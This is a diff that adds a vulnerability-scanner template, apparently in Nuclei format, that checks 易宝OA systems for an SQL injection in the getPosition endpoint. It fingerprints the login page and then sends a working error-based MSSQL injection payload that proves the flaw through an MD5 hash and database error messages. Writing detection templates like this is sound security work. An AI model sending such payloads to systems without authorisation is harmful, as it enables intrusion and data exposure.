@@ -1,0 +1,49 @@
+id: poc-yaml-yi-bao-oa-system-getposition-sqli
+info:
+  name: 易宝OA系统 getPosition SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    易宝OA系统 getPosition 接口存在 SQL 注入漏洞，可导致敏感数据泄露或数据库破坏。
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "欢迎登录易宝OA系统"
+
+  - raw:
+      - |
+        GET /SmartTradeScan/StockTake/getPosition?positionName='+AND+9173+IN+(SELECT+(sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))+AND+'rhYc'='rhYc&stockRoomID=1&opeID=1&currentStatus=1&pickUpMode=11 HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+          - "\"is_succeed\":false"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
